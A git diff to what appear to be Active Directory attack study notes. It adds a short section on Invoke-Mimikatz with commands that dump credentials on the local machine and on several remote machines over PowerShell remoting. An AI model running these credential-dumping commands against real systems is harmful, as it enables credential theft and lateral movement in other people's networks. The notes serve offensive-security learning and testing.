@@ -346,6 +346,12 @@ println "out> $sout err> $err"
   - Using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the memory. All the functions of mimikatz could be used from this scipt.
   - The script needs administrative privileges for dumping credentials from local machines. Many attacks need specific privileges which are covered while discussing that attack.
 
+**Invoke Mimikatz**
+- Dump credentials on a local machine
+  - `Invoke-Mimikatz -DumpCreds`
+- Dump credentials on multiple remote machines
+  - `Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")`
+- Invoke-Mimikatz uses PowerShell remoting cmdlet `Invoke-Command` to do above.
 
 ## Domain Persistence Part 1
 ## Domain Persistence Part 2
